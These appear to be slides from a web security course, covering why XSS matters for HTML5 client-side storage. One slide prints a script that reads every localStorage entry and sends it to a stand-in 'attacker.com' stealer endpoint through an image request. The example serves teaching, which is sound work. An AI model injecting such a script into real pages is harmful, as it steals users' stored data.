<!-- .slide: class="center" -->
# Day 3

--
# What Was covered

1. XSS
1. CORS

--
<!-- .slide: class="center" -->
# Why XSS is so important

--
# Why XSS Why
XSS is more important with HTML5 as people are using stuff like 

1. websql
1. localstorage
1. offline cache.

--
<!-- .slide: class="center" -->
# All these are 
# accessible 
# to one thing

--
<!-- .slide: class="center" -->
# JAVASCRIPT

--
<!-- .slide: class="center" -->
# XSS 
# enables 
# arbitrary 
## javascript

--
<!-- .slide: class="center" -->
# That's why XSS

--

# Need more reason's

1. Javascript can tamper with the data.
1. Javascript can add delete update data.
1. No httpOnly for webstorage/localstorage. Hence no protection

--

# Steal data via Javascript

<pre>
&lt;script>

for (i in localStorage) {

var d = new Image();

d.src = 'http://attacker.com/stealer.php?' + i+ '=' + localStorage.getItem(i);

} 

&lt;/script>
</pre>

--
# Day 3 course

